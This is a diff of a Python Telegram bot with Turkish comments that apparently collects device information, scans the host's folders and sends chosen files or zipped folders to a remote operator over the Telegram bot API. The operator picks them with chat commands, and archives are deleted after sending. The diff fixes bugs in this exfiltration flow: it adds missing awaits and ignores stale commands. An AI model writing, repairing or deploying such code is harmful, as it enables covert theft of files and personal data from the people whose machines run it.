@@ -15,6 +15,8 @@ TELEGRAM_MESSAGE_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
 # Dosya-nesne eşleştirmesi
 dosya_haritasi = {}
 
+START_TIME = time.time()
+
 def cihaz_bilgisi_al():
     bilgiler = {}
     try:
@@ -165,6 +167,10 @@ def bilgileri_kaydet_ve_gonder():
     print(f"{dosya_dosyasi} Telegram'a gönderildi!")
 
 async def select_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # Mesajın zamanı botun başlangıcından önceyse ignore et
+    if update.message.date.timestamp() < START_TIME:
+        return
+
     try:
         numara = context.args[0]
         dosya_yolu = dosya_haritasi.get(numara)
@@ -177,8 +183,13 @@ async def select_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         print(f"{numara} numaralı dosya ({dosya_yolu}) Telegram'a gönderildi!")
     except Exception as e:
         await update.message.reply_text(f"Hata, dosya gönderilemedi! ({str(e)})")
-        
+
+
 async def category(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # Mesajın zamanı botun başlangıcından önceyse ignore et
+    if update.message.date.timestamp() < START_TIME:
+        return
+    
     _, klasorler = dosya_tara()  # Klasör listesini al
     kategori_listesi = "\n".join([f"{i+1}. {k}" for i, k in enumerate(klasorler.keys())])
     mesaj = (
@@ -192,13 +203,13 @@ async def category(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     kategori = " ".join(context.args).strip()
     if kategori not in klasorler:
-        update.message.reply_text(f"Geçersiz kategori: {kategori}, kral! 😈 Listeden seç:\n{mesaj}")
+        await update.message.reply_text(f"Geçersiz kategori: {kategori}, kral! 😈 Listeden seç:\n{mesaj}")
         return
     
     klasor_yolu = klasorler[kategori]
     arsiv_yolu = arsiv_olustur(kategori, klasor_yolu)
     if not arsiv_yolu:
-        update.message.reply_text(f"Arşiv oluşturulamadı, kral! 😈 Hata: {arsiv_yolu[1]}")
+        await update.message.reply_text(f"Arşiv oluşturulamadı, kral! 😈 Hata: {arsiv_yolu[1]}")
         return
     
     try:
@@ -208,7 +219,7 @@ async def category(update: Update, context: ContextTypes.DEFAULT_TYPE):
         os.remove(arsiv_yolu)  # Arşivi gönderildikten sonra sil
         print(f"{arsiv_yolu} silindi!")
     except Exception as e:
-        update.message.reply_text(f"Hata, arşiv gönderilemedi: {str(e)}")
+        await update.message.reply_text(f"Hata, arşiv gönderilemedi: {str(e)}")
 
 def main():
     print("Botu başlatıyorum, kral! 😈")
